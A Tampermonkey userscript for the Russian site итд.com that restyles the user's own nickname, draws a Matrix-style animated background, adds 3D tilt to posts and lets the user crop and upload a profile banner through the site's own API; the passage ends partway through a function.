// ==UserScript==
// @name         ITD Visual Pack
// @namespace    http://tampermonkey.net/
// @version      2.2.0
// @author       NeuroSFW
// @description  Подсветка своего ника с выпадающим списком стилей + визуальные эффекты + загрузка баннера
// @match        https://xn--d1ah4a.com/*
// @match        https://итд.com/*
// @grant        GM_xmlhttpRequest
// @grant        GM_setValue
// @grant        GM_getValue
// @run-at       document-idle
// @downloadURL  https://raw.githubusercontent.com/kiwe147/ITD-Visual-Pack/main/ITD-Visual-Pack.user.js
// @updateURL    https://raw.githubusercontent.com/kiwe147/ITD-Visual-Pack/main/ITD-Visual-Pack.user.js
// @icon         data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><defs><filter id='glow' x='-20%' y='-20%' width='140%' height='140%'><feGaussianBlur in='SourceGraphic' stdDeviation='3' result='blur'/></filter><linearGradient id='rainbow' x1='0%' y1='0%' x2='100%' y2='100%'><stop offset='0%' style='stop-color:%23ff0000'/><stop offset='16%' style='stop-color:%23ff8800'/><stop offset='33%' style='stop-color:%23ffff00'/><stop offset='50%' style='stop-color:%2300ff00'/><stop offset='66%' style='stop-color:%2300ffff'/><stop offset='83%' style='stop-color:%230000ff'/><stop offset='100%' style='stop-color:%23ff00ff'/></linearGradient></defs><rect width='100' height='100' rx='20' fill='%231a1a1a'/><text x='50' y='72' font-family='Arial, sans-serif' font-size='60' font-weight='bold' text-anchor='middle' fill='url(%23rainbow)' filter='url(%23glow)' opacity='0.9'>N</text><text x='50' y='72' font-family='Arial, sans-serif' font-size='60' font-weight='bold' text-anchor='middle' fill='url(%23rainbow)'>N</text></svg>
// ==/UserScript==

(function() {
    'use strict';

    // ==================== ЧАСТЬ 1: ПОДСВЕТКА НИКА ====================

    let globalHue = 0;
    let colorDirection = 1;
    let myUsername = null;
    let myDisplayName = null;
    let nickElements = new Set();
    let currentStyle = GM_getValue('nickStyle', 'white');

    const CYCLE_DURATION = 12000;

    const nickStyles = {
        fire: {
            name: 'Огненный',
            color: '#ff4400',
            gradientLight: 'linear-gradient(270deg, #ff2200, #ff6600, #ffaa00)',
            gradientDark: 'linear-gradient(270deg, #ff4400, #ff8800, #ffcc22)',
            glow: 'drop-shadow(0 0 12px rgba(255, 68, 0, 0.7)) drop-shadow(0 0 20px rgba(255, 68, 0, 0.4))',
            matrixHue: 25,
            avatarHue: 25,
            matrixSat: 100,
            avatarSat: 100
        },
        pinkNeon: {
            name: 'Розовый неон',
            color: '#ff2d75',
            gradientLight: 'linear-gradient(270deg, #ff2d75, #ff69b4, #ff9eb5)',
            gradientDark: 'linear-gradient(270deg, #ff44aa, #ff77cc, #ff99dd)',
            glow: 'drop-shadow(0 0 12px #ff2d75) drop-shadow(0 0 20px #ff2d75)',
            matrixHue: 330,
            avatarHue: 330,
            matrixSat: 100,
            avatarSat: 100
        },
        gold: {
            name: 'Золотой',
            color: '#ffd700',
            gradientLight: 'linear-gradient(270deg, #ffd700, #ffb347, #ff8c00)',
            gradientDark: 'linear-gradient(270deg, #ffea00, #ffcc44, #ffaa33)',
            glow: 'drop-shadow(0 0 8px rgba(255, 215, 0, 0.7)) drop-shadow(0 0 15px rgba(255, 215, 0, 0.4))',
            matrixHue: 50,
            avatarHue: 50,
            matrixSat: 100,
            avatarSat: 100
        },
        neonPulse: {
            name: 'Неон-пульс',
            color: '#00ff88',
            gradientLight: 'linear-gradient(270deg, #00ff88, #00ffcc, #88ffcc)',
            gradientDark: 'linear-gradient(270deg, #44ffaa, #44ffdd, #aaffdd)',
            glow: 'drop-shadow(0 0 8px #00ff88) drop-shadow(0 0 15px #00ff88)',
            matrixHue: 155,
            avatarHue: 155,
            matrixSat: 100,
            avatarSat: 100
        },
        matrix: {
            name: 'Матрица',
            color: '#0f0',
            gradientLight: 'linear-gradient(270deg, #0f0, #0f8, #0f0)',
            gradientDark: 'linear-gradient(270deg, #2f2, #2fa, #2f2)',
            glow: 'drop-shadow(0 0 6px #0f0) drop-shadow(0 0 12px #0f0)',
            matrixHue: 120,
            avatarHue: 120,
            matrixSat: 100,
            avatarSat: 100
        },
        blueGlow: {
            name: 'Голубое свечение',
            color: '#00b4d8',
            gradientLight: 'linear-gradient(270deg, #0288d1, #00b4d8, #48cae4)',
            gradientDark: 'linear-gradient(270deg, #4fc3f7, #90e0ef, #caf0f8)',
            glow: 'drop-shadow(0 0 12px #00b4d8) drop-shadow(0 0 20px #0288d1)',
            matrixHue: 195,
            avatarHue: 195,
            matrixSat: 100,
            avatarSat: 100
        },
        purpleMystic: {
            name: 'Фиолетовый мистик',
            color: '#9b30ff',
            gradientLight: 'linear-gradient(270deg, #7b2fff, #9b30ff, #c55aff)',
            gradientDark: 'linear-gradient(270deg, #9b44ff, #bb66ff, #dd88ff)',
            glow: 'drop-shadow(0 0 12px #9b30ff) drop-shadow(0 0 20px #7b2fff)',
            matrixHue: 270,
            avatarHue: 270,
            matrixSat: 100,
            avatarSat: 100
        },
        default: {
            name: 'Стандартный',
            color: '#0288d1',
            gradientLight: 'linear-gradient(270deg, #0288d1, #26c6da)',
            gradientDark: 'linear-gradient(270deg, #4fc3f7, #e0f7fa)',
            glow: 'drop-shadow(0 2px 16px rgba(0, 128, 255, 0.4))',
            matrixHue: 210,
            avatarHue: 210,
            matrixSat: 100,
            avatarSat: 100
        },
        white: {
            name: 'Белый',
            color: '#ffffff',
            gradientLight: 'linear-gradient(270deg, #e0e0e0, #ffffff, #f0f0f0)',
            gradientDark: 'linear-gradient(270deg, #d0d0d0, #ffffff, #e8e8e8)',
            glow: 'drop-shadow(0 0 10px rgba(255, 255, 255, 0.6)) drop-shadow(0 0 20px rgba(255, 255, 255, 0.3))',
            matrixHue: 0,
            avatarHue: 0,
            matrixSat: 15,
            avatarSat: 15
        },
        rainbow: {
            name: 'Радужный',
            color: 'rainbow',
            gradientLight: null,
            gradientDark: null,
            glow: null,
            matrixHue: null,
            avatarHue: null,
            matrixSat: 100,
            avatarSat: 100,
            animated: true
        }
    };

    const styleKeys = Object.keys(nickStyles);

    const globalStyles = document.createElement('style');
    globalStyles.textContent = `
        .nick-style-toggle {
            display: inline-flex !important;
            align-items: center !important;
            justify-content: center !important;
            width: 32px !important;
            height: 32px !important;
            margin-left: 10px !important;
            cursor: pointer !important;
            background: var(--bg-secondary, rgba(128, 128, 128, 0.15)) !important;
            border-radius: 50% !important;
            transition: all 0.2s ease !important;
            vertical-align: middle !important;
            flex-shrink: 0 !important;
        }
        .nick-style-toggle:hover {
            background: var(--accent-primary, rgba(0, 128, 255, 0.3)) !important;
            transform: scale(1.08) !important;
        }
        .nick-style-toggle svg {
            width: 18px !important;
            height: 18px !important;
            stroke: var(--text-primary, currentColor) !important;
            fill: none !important;
        }
        .nick-style-dropdown {
            background: var(--block-bg, #1e1e2e) !important;
            border-radius: 24px !important;
            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.3) !important;
            padding: 8px !important;
            min-width: 210px !important;
            z-index: 10000 !important;
            border: 1px solid var(--border-color, rgba(255, 255, 255, 0.1)) !important;
            backdrop-filter: blur(20px) !important;
            -webkit-backdrop-filter: blur(20px) !important;
            animation: dropdownFadeIn 0.15s ease !important;
        }
        @keyframes dropdownFadeIn {
            from { opacity: 0; transform: translateY(-8px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .nick-style-option {
            padding: 8px 12px !important;
            cursor: pointer !important;
            transition: all 0.15s ease !important;
            color: var(--text-primary, #ffffff) !important;
            font-size: 14px !important;
            font-family: inherit !important;
            border-radius: 16px !important;
            display: flex !important;
            align-items: center !important;
            gap: 12px !important;
        }
        .nick-style-option:hover {
            background: var(--bg-hover, rgba(0, 128, 255, 0.15)) !important;
            transform: translateX(2px) !important;
        }
        .style-color-dot {
            width: 24px !important;
            height: 24px !important;
            border-radius: 12px !important;
            flex-shrink: 0 !important;
            transition: all 0.2s ease !important;
        }
        .style-color-dot.rainbow-dot {
            background: linear-gradient(135deg, #ff0000, #ff8800, #ffff00, #00ff00, #00ffff, #0000ff, #ff00ff) !important;
            background-size: 200% 200% !important;
            animation: dotRainbow 12s ease infinite !important;
        }
        @keyframes dotRainbow {
            0% { background-position: 0% 50%; }
            100% { background-position: 200% 50%; }
        }
        .nick-style-option:not(:last-child) {
            margin-bottom: 2px !important;
        }
        .DOkg, article {
            transition: transform 0.15s ease-out !important;
            transform-style: preserve-3d !important;
            perspective: 1200px !important;
        }
    `;
    document.head.appendChild(globalStyles);

    const canvas = document.createElement('canvas');
    canvas.style.cssText = `position:fixed;top:0;left:0;width:100%;height:100%;z-index:-1;opacity:0.12;pointer-events:none;`;
    document.body.appendChild(canvas);
    const ctx = canvas.getContext('2d');
    const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン';
    const fontSize = 14;
    let columns, drops = [];

    function resizeCanvas() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
        columns = Math.floor(canvas.width / fontSize);
        drops.length = columns;
        for (let i = 0; i < drops.length; i++) {
            if (drops[i] === undefined) drops[i] = Math.random() * canvas.height / fontSize;
        }
    }

    function drawMatrix() {
        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.font = `${fontSize}px monospace`;

        const style = nickStyles[currentStyle];
        for (let i = 0; i < drops.length; i++) {
            let charHue, saturation;
            if (style.animated) {
                charHue = globalHue + (Math.random() - 0.5) * 25;
                saturation = 100;
            } else {
                charHue = (style.matrixHue || 210) + (Math.random() - 0.5) * 25;
                saturation = style.matrixSat !== undefined ? style.matrixSat : 100;
            }
            ctx.fillStyle = `hsl(${charHue}, ${saturation}%, 55%)`;
            const text = chars[Math.floor(Math.random() * chars.length)];
            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
            if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
            drops[i]++;
        }
    }

    function updateAvatarGlow() {
        const avatars = document.querySelectorAll('.my-avatar-glow');
        if (currentStyle === 'rainbow') {
            const color = `hsl(${globalHue}, 100%, 55%)`;
            avatars.forEach(avatar => {
                avatar.style.filter = `drop-shadow(0 0 3px ${color}) drop-shadow(0 0 6px ${color})`;
            });
        } else {
            const style = nickStyles[currentStyle];
            const hue = style.avatarHue || 210;
            const sat = style.avatarSat !== undefined ? style.avatarSat : 100;
            avatars.forEach(avatar => {
                avatar.style.filter = `drop-shadow(0 0 3px hsl(${hue}, ${sat}%, 60%)) drop-shadow(0 0 6px hsl(${hue}, ${sat}%, 60%))`;
            });
        }
    }

    function glowMyAvatar(avatar) {
        if (avatar && !avatar.classList.contains('my-avatar-glow')) {
            avatar.classList.add('my-avatar-glow');
            updateAvatarGlow();
            return true;
        }
        return false;
    }

    function updateAllNickColors() {
        if (currentStyle === 'rainbow') {
            const color = `hsl(${globalHue}, 100%, 55%)`;
            for (const el of nickElements) {
                if (el && el.isConnected) {
                    el.style.color = color;
                    el.style.textShadow = `0 0 5px ${color}`;
                    el.style.webkitTextFillColor = '';
                    el.style.background = '';
                }
            }
        } else {
            const style = nickStyles[currentStyle];
            const isDark = document.documentElement.getAttribute('data-theme') === 'dark';
            const gradient = isDark && style.gradientDark ? style.gradientDark : style.gradientLight;

            for (const el of nickElements) {
                if (el && el.isConnected) {
                    if (gradient) {
                        el.style.background = gradient;
                        el.style.webkitBackgroundClip = 'text';
                        el.style.backgroundClip = 'text';
                        el.style.webkitTextFillColor = 'transparent';
                        el.style.color = '';
                        el.style.textShadow = '';
                    }
                }
            }
        }
    }

    function updateNickGlow() {
        if (currentStyle === 'rainbow') {
            const color = `hsl(${globalHue}, 100%, 55%)`;
            for (const nickSpan of nickElements) {
                if (nickSpan && nickSpan.isConnected) {
                    const parentBlock = nickSpan.closest('.NGIa');
                    if (parentBlock) {
                        parentBlock.style.filter = `drop-shadow(0 0 6px ${color}) drop-shadow(0 0 12px ${color})`;
                    }
                }
            }
        } else {
            const style = nickStyles[currentStyle];
            for (const nickSpan of nickElements) {
                if (nickSpan && nickSpan.isConnected) {
                    const parentBlock = nickSpan.closest('.NGIa');
                    if (parentBlock && style.glow) {
                        parentBlock.style.filter = style.glow;
                    }
                }
            }
        }
    }

    function updateColors() {
        if (currentStyle === 'rainbow') {
            globalHue += colorDirection * 0.8;
            if (globalHue >= 360) { globalHue = 360; colorDirection = -1; }
            else if (globalHue <= 0) { globalHue = 0; colorDirection = 1; }
        }

        updateAllNickColors();
        updateNickGlow();
        updateAvatarGlow();
        drawMatrix();
    }

    let dropdown = null;
    let scrollHandler = null;
    let resizeHandler = null;
    let closeHandler = null;
    let currentButton = null;

    function getColorDot(styleKey) {
        const style = nickStyles[styleKey];
        const dot = document.createElement('div');
        dot.className = 'style-color-dot';

        if (styleKey === 'rainbow') {
            dot.classList.add('rainbow-dot');
        } else {
            dot.style.background = style.color;
            dot.style.boxShadow = `0 0 6px ${style.color}`;
        }
        return dot;
    }

    function updateDropdownPosition() {
        if (!dropdown || !currentButton || !currentButton.isConnected) return;
        const rect = currentButton.getBoundingClientRect();

        const isButtonVisible = rect.top < window.innerHeight && rect.bottom > 0 && rect.left < window.innerWidth && rect.right > 0;

        if (!isButtonVisible) {
            dropdown.remove();
            dropdown = null;
            if (scrollHandler) window.removeEventListener('scroll', scrollHandler);
            if (resizeHandler) window.removeEventListener('resize', resizeHandler);
            if (closeHandler) document.removeEventListener('click', closeHandler);
            currentButton = null;
            return;
        }

        let left = rect.right + 8;
        let top = rect.top;

        const dropdownWidth = 210;
        if (left + dropdownWidth > window.innerWidth) {
            left = rect.left - dropdownWidth - 8;
        }

        if (left < 8) {
            left = 8;
        }

        const dropdownHeight = styleKeys.length * 42;
        if (top + dropdownHeight > window.innerHeight) {
            top = window.innerHeight - dropdownHeight - 8;
        }
        if (top < 8) {
            top = 8;
        }

        dropdown.style.position = 'fixed';
        dropdown.style.top = `${top}px`;
        dropdown.style.left = `${left}px`;
    }

    function createDropdown(button) {
        if (dropdown) {
            dropdown.remove();
            if (scrollHandler) window.removeEventListener('scroll', scrollHandler);
            if (resizeHandler) window.removeEventListener('resize', resizeHandler);
            if (closeHandler) document.removeEventListener('click', closeHandler);
        }

        currentButton = button;
        dropdown = document.createElement('div');
        dropdown.className = 'nick-style-dropdown';

        styleKeys.forEach(key => {
            const style = nickStyles[key];
            const option = document.createElement('div');
            option.className = 'nick-style-option';

            const colorDot = getColorDot(key);
            const textSpan = document.createElement('span');
            textSpan.textContent = style.name;

            option.appendChild(colorDot);
            option.appendChild(textSpan);

            option.onclick = (e) => {
                e.stopPropagation();
                currentStyle = key;
                GM_setValue('nickStyle', currentStyle);

                const avatars = document.querySelectorAll('.my-avatar-glow');
                avatars.forEach(avatar => {
                    avatar.style.filter = '';
                });

                for (const el of nickElements) {
                    if (el && el.isConnected) {
                        if (currentStyle === 'rainbow') {
                            el.style.background = '';
                        } else {
                            const isDark = document.documentElement.getAttribute('data-theme') === 'dark';
                            const gradient = isDark && style.gradientDark ? style.gradientDark : style.gradientLight;
                            if (gradient) {
                                el.style.background = gradient;
                                el.style.webkitBackgroundClip = 'text';
                                el.style.backgroundClip = 'text';
                                el.style.webkitTextFillColor = 'transparent';
                            }
                        }
                    }
                }
                updateAllNickColors();
                updateNickGlow();
                updateAvatarGlow();

                dropdown.remove();
                dropdown = null;
                if (scrollHandler) window.removeEventListener('scroll', scrollHandler);
                if (resizeHandler) window.removeEventListener('resize', resizeHandler);
                if (closeHandler) document.removeEventListener('click', closeHandler);
                currentButton = null;

                const btn = document.querySelector('.nick-style-toggle');
                if (btn) btn.title = `Стиль: ${style.name}`;
            };
            dropdown.appendChild(option);
        });

        updateDropdownPosition();
        document.body.appendChild(dropdown);

        scrollHandler = () => updateDropdownPosition();
        resizeHandler = () => updateDropdownPosition();

        window.addEventListener('scroll', scrollHandler);
        window.addEventListener('resize', resizeHandler);

        closeHandler = (e) => {
            if (dropdown && !dropdown.contains(e.target) && e.target !== currentButton) {
                dropdown.remove();
                dropdown = null;
                window.removeEventListener('scroll', scrollHandler);
                window.removeEventListener('resize', resizeHandler);
                document.removeEventListener('click', closeHandler);
                currentButton = null;
            }
        };
        setTimeout(() => document.addEventListener('click', closeHandler), 0);
    }

    function addToggleButtonToNick(nickContainer) {
        const nickSpan = nickContainer.querySelector('.MF3T');
        if (!nickSpan) return;

        const nickText = nickSpan.textContent.trim();
        if (nickText !== myUsername && nickText !== myDisplayName) return;

        if (nickContainer.querySelector('.nick-style-toggle')) return;

        const button = document.createElement('span');
        button.className = 'nick-style-toggle';
        button.title = `Стиль: ${nickStyles[currentStyle].name}`;
        button.innerHTML = `<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 3v1m0 16v1M3 12h1m16 0h1M5.6 5.6l.7.7m12.1 12.1l.7.7M5.6 18.4l.7-.7m12.1-12.1l.7-.7"/><circle cx="12" cy="12" r="4"/></svg>`;

        button.addEventListener('click', (e) => {
            e.preventDefault();
            e.stopPropagation();
            createDropdown(button);
        });

        nickContainer.appendChild(button);
    }

    function add3DEffect(post) {
        if (post.hasAttribute('data-3d')) return;
        post.setAttribute('data-3d', 'true');
        post.addEventListener('mousemove', (e) => {
            const rect = post.getBoundingClientRect();
            const x = e.clientX - rect.left, y = e.clientY - rect.top;
            const rotateY = ((x - rect.width/2) / (rect.width/2)) * 4;
            const rotateX = ((rect.height/2 - y) / (rect.height/2)) * 4;
            post.style.transform = `perspective(1200px) rotateX(${rotateX}deg) rotateY(${rotateY}deg) scale(1.01)`;
            post.style.boxShadow = '0 10px 25px rgba(0,0,0,0.12)';
        });
        post.addEventListener('mouseleave', () => {
            post.style.transform = 'perspective(1200px) rotateX(0deg) rotateY(0deg) scale(1)';
            post.style.boxShadow = '';
        });
    }

    // ==================== ЧАСТЬ 2: ЗАГРУЗКА БАННЕРА ====================

    let draggableImg = null;
    let currentTop = 0;
    let banner = null;
    let buttonsContainer = null;
    let isDragging = false;
    let dragStartY = 0;
    let startTop = 0;

    let drawBtn = null;
    let deleteBtn = null;
    let imageBtn = null;
    let cancelBtn = null;
    let applyBtn = null;
    let changeBtn = null;

    function addBannerStyles() {
        if (document.getElementById('custom-banner-styles')) return;

        const style = document.createElement('style');
        style.id = 'custom-banner-styles';
        style.textContent = `
            .custom-image-btn:hover {
                background: var(--accent-primary, #0080FF) !important;
                color: #fff !important;
            }
            .custom-cancel-btn:hover {
                background: #dc3545cc !important;
            }
            .custom-apply-btn:hover {
                background: #28a745cc !important;
            }
            .custom-change-btn:hover {
                background: var(--accent-primary, #0080FF) !important;
                color: #fff !important;
            }
            @keyframes spin {
                from { transform: rotate(0deg); }
                to { transform: rotate(360deg); }
            }
            .spin-animation {
                animation: spin 1s linear infinite;
                transform-origin: center;
            }
        `;
        document.head.appendChild(style);
    }

    function createAllButtons() {
        buttonsContainer = document.querySelector('.CkUM');
        if (!buttonsContainer) return false;

        if (buttonsContainer.querySelector('.custom-image-btn')) return true;

        addBannerStyles();

        drawBtn = buttonsContainer.querySelector('button:not(.VYC5)');
        deleteBtn = buttonsContainer.querySelector('.VYC5');

        imageBtn = document.createElement('button');
        imageBtn.className = 'czqD custom-image-btn';
        imageBtn.title = 'Добавить картинку';
        imageBtn.innerHTML = `
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="2" y="2" width="20" height="20" rx="2.18" ry="2.18"></rect>
                <circle cx="8.5" cy="8.5" r="2.5"></circle>
                <polyline points="21 15 16 10 5 21"></polyline>
            </svg>
        `;

        if (deleteBtn) {
            buttonsContainer.insertBefore(imageBtn, deleteBtn);
        } else {
            buttonsContainer.appendChild(imageBtn);
        }

        changeBtn = document.createElement('button');
        changeBtn.className = 'czqD custom-change-btn';
        changeBtn.title = 'Сменить картинку';
        changeBtn.style.display = 'none';
        changeBtn.innerHTML = `
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <rect x="2" y="2" width="20" height="20" rx="2.18" ry="2.18"></rect>
                <circle cx="8.5" cy="8.5" r="2.5"></circle>
                <polyline points="21 15 16 10 5 21"></polyline>
            </svg>
        `;

        cancelBtn = document.createElement('button');
        cancelBtn.className = 'czqD custom-cancel-btn';
        cancelBtn.title = 'Отмена';
        cancelBtn.style.display = 'none';
        cancelBtn.innerHTML = `
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <line x1="18" y1="6" x2="6" y2="18"></line>
                <line x1="6" y1="6" x2="18" y2="18"></line>
            </svg>
        `;

        applyBtn = document.createElement('button');
        applyBtn.className = 'czqD custom-apply-btn';
        applyBtn.title = 'Применить';
        applyBtn.style.display = 'none';
        applyBtn.innerHTML = `
            <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                <polyline points="20 6 9 17 4 12"></polyline>
            </svg>
        `;

        buttonsContainer.appendChild(changeBtn);
        buttonsContainer.appendChild(cancelBtn);
        buttonsContainer.appendChild(applyBtn);

        imageBtn.onclick = () => openFilePicker();
        changeBtn.onclick = () => openFilePicker();

        cancelBtn.onclick = () => {
            removeDraggableImage();
            showNormalMode();
        };

        applyBtn.onclick = async () => {
            if (!draggableImg || !banner) return;

            applyBtn.innerHTML = `
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="spin-animation">
                    <line x1="12" y1="2" x2="12" y2="6"></line>
                    <line x1="12" y1="18" x2="12" y2="22"></line>
                    <line x1="4.93" y1="4.93" x2="7.76" y2="7.76"></line>
                    <line x1="16.24" y1="16.24" x2="19.07" y2="19.07"></line>
                    <line x1="2" y1="12" x2="6" y2="12"></line>
                    <line x1="18" y1="12" x2="22" y2="12"></line>
                    <line x1="4.93" y1="19.07" x2="7.76" y2="16.24"></line>
                    <line x1="16.24" y1="7.76" x2="19.07" y2="4.93"></line>
                </svg>
            `;
            applyBtn.disabled = true;

            try {
                const croppedBlob = await cropBannerImage();

                const refreshRes = await fetch('/api/v1/auth/refresh', { method: 'POST' });
                const { accessToken } = await refreshRes.json();

                const formData = new FormData();
                formData.append('file', croppedBlob, 'banner.jpg');

                const uploadRes = await fetch('/api/files/upload', {
                    method: 'POST',
                    headers: { 'Authorization': `Bearer ${accessToken}` },
                    body: formData
                });

                if (!uploadRes.ok) throw new Error(`Upload failed: ${uploadRes.status}`);

                const uploadData = await uploadRes.json();

                const updateRes = await fetch('/api/users/me', {
                    method: 'PUT',
                    headers: {
                        'Content-Type': 'application/json',
                        'Authorization': `Bearer ${accessToken}`
                    },
                    body: JSON.stringify({ bannerId: uploadData.id })
                });

                if (!updateRes.ok) throw new Error(`Update failed: ${updateRes.status}`);

                removeDraggableImage();

                const originalImg = banner.querySelector('img');
                if (originalImg) {
                    originalImg.src = uploadData.url;
                    originalImg.style.position = '';
                    originalImg.style.zIndex = '';
                }

                showNormalMode();

            } catch (error) {
                console.error('Ошибка:', error);
                applyBtn.innerHTML = `
                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                        <polyline points="20 6 9 17 4 12"></polyline>
                    </svg>
                `;
                applyBtn.disabled = false;
            }
        };

        return true;
    }

    function openFilePicker() {
        const input = document.createElement('input');
        input.type = 'file';
        input.accept = 'image/jpeg,image/png,image/webp,image/gif';
        input.onchange = (e) => {
            const file = e.target.files[0];
            if (!file) return;
            const url = URL.createObjectURL(file);
            removeDraggableImage();
            createDraggableImage(url);
            showEditMode();
        };
        input.click();
    }

    function showEditMode() {
        if (banner) banner.style.zIndex = '0';

        const originalImg = banner?.querySelector('img');
        if (originalImg) {
            originalImg.style.position = 'relative';
            originalImg.style.zIndex = '-3';
        }

        if (cancelBtn) cancelBtn.style.display = '';
        if (applyBtn) applyBtn.style.display = '';
        if (changeBtn) changeBtn.style.display = '';

        if (drawBtn) drawBtn.style.display = 'none';
        if (deleteBtn) deleteBtn.style.display = 'none';
        if (imageBtn) imageBtn.style.display = 'none';
    }

    function showNormalMode() {
        if (banner) banner.style.zIndex = '';

        const originalImg = banner?.querySelector('img');
        if (originalImg) {
            originalImg.style.position = '';
            originalImg.style.zIndex = '';
        }

        if (drawBtn) drawBtn.style.display = '';
        if (deleteBtn) deleteBtn.style.display = '';
        if (imageBtn) imageBtn.style.display = '';

        if (cancelBtn) cancelBtn.style.display = 'none';
        if (applyBtn) {
            applyBtn.style.display = 'none';
            applyBtn.innerHTML = `
                <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <polyline points="20 6 9 17 4 12"></polyline>
                </svg>
            `;
            applyBtn.disabled = false;
        }
        if (changeBtn) changeBtn.style.display = 'none';
    }

    function cropBannerImage() {
        return new Promise((resolve, reject) => {
            const bannerRect = banner.getBoundingClientRect();
            const imgRect = draggableImg.getBoundingClientRect();
            const imgNaturalWidth = draggableImg.naturalWidth;
            const imgNaturalHeight = draggableImg.naturalHeight;
            const imgDisplayWidth = draggableImg.offsetWidth;
            const imgDisplayHeight = draggableImg.offsetHeight;

            const scaleX = imgNaturalWidth / imgDisplayWidth;
            const scaleY = imgNaturalHeight / imgDisplayHeight;

            const cropX = Math.max(0, (bannerRect.left - imgRect.left)) * scaleX;
            const cropY = Math.max(0, (bannerRect.top - imgRect.top)) * scaleY;
            const cropWidth = Math.min(imgRect.right, bannerRect.right) - Math.max(imgRect.left, bannerRect.left);
            const cropHeight = Math.min(imgRect.bottom, bannerRect.bottom) - Math.max(imgRect.top, bannerRect.top);
            const naturalCropWidth = cropWidth * scaleX;
            const naturalCropHeight = cropHeight * scaleY;

            const canvas = document.createElement('canvas');
            canvas.width = naturalCropWidth;
            canvas.height = naturalCropHeight;
            const ctx = canvas.getContext('2d');

            const tempImg = new Image();
            tempImg.crossOrigin = 'anonymous';
            tempImg.onload = () => {
                ctx.drawImage(tempImg, cropX, cropY, naturalCropWidth, naturalCropHeight, 0, 0, naturalCropWidth, naturalCropHeight);
                canvas.toBlob((blob) => {
                    resolve(blob);
                }, 'image/jpeg', 0.95);
            };
            tempImg.onerror = reject;
            tempImg.src = draggableImg.src;
        });
    }

    function createDraggableImage(url) {
        banner = document.querySelector('.p6eM');
        if (!banner) return;

        removeDraggableImage();

        banner.style.position = 'relative';
        banner.style.overflow = 'hidden';

        draggableImg = document.createElement('img');
        draggableImg.src = url;
        draggableImg.style.cssText = `
            position: absolute;
            left: 0;
            top: 0;
            width: 100%;
            height: auto;
            z-index: -1;
            pointer-events: auto;
            cursor: grab;
            user-select: none;
            -webkit-user-drag: none;
        `;
        draggableImg.setAttribute('draggable', 'false');

        banner.appendChild(draggableImg);

        const updateImagePosition = () => {
            const bannerHeight = banner.clientHeight;
            const imgHeight = draggableImg.offsetHeight;

            currentTop = (bannerHeight - imgHeight) / 2;
            draggableImg.style.top = currentTop + 'px';
        };

        draggableImg.onload = updateImagePosition;
        if (draggableImg.complete) updateImagePosition();

        banner.addEventListener('wheel', (e) => {
            if (!draggableImg || isDragging) return;
            e.preventDefault();

            const bannerHeight = banner.clientHeight;
            const imgHeight = draggableImg.offsetHeight;
            if (imgHeight <= bannerHeight) return;

            const delta = e.deltaY > 0 ? -30 : 30;
            let newTop = currentTop + delta;
            newTop = Math.max(bannerHeight - imgHeight, Math.min(0, newTop));

            draggableImg.style.top = newTop + 'px';
            currentTop = newTop;
        }, { passive: false });

        draggableImg.addEventListener('mousedown', (e) => {
            if (draggableImg.offsetHeight <= banner.clientHeight) return;
            e.preventDefault();
            isDragging = true;
            dragStartY = e.clientY;
            startTop = currentTop;
            draggableImg.style.cursor = 'grabbing';
            draggableImg.style.transition = 'none';
        });

        window.addEventListener('mousemove', (e) => {
            if (!isDragging || !draggableImg) return;
            e.preventDefault();

            const deltaY = e.clientY - dragStartY;
            let newTop = startTop + deltaY;
            const imgHeight = draggableImg.offsetHeight;
            newTop = Math.max(banner.clientHeight - imgHeight, Math.min(0, newTop));

            draggableImg.style.top = newTop + 'px';
            currentTop = newTop;
        });

        window.addEventListener('mouseup', () => {
            if (isDragging) {
                isDragging = false;
                if (draggableImg) {
                    draggableImg.style.cursor = 'grab';
                    draggableImg.style.transition = 'top 0.1s ease-out';
                }
            }
        });

        draggableImg.addEventListener('touchstart', (e) => {
            if (draggableImg.offsetHeight <= banner.clientHeight) return;
            isDragging = true;
            dragStartY = e.touches[0].clientY;
            startTop = currentTop;
            draggableImg.style.transition = 'none';
        }, { passive: false });

        window.addEventListener('touchmove', (e) => {
            if (!isDragging || !draggableImg) return;
            e.preventDefault();

            const deltaY = e.touches[0].clientY - dragStartY;
            let newTop = startTop + deltaY;
            const imgHeight = draggableImg.offsetHeight;
            newTop = Math.max(banner.clientHeight - imgHeight, Math.min(0, newTop));

            draggableImg.style.top = newTop + 'px';
            currentTop = newTop;
        }, { passive: false });

        window.addEventListener('touchend', () => {
            if (isDragging) {
                isDragging = false;
                if (draggableImg) draggableImg.style.transition = 'top 0.1s ease-out';
            }
        });
    }

    function removeDraggableImage() {
        if (draggableImg) {
            draggableImg.remove();
            draggableImg = null;
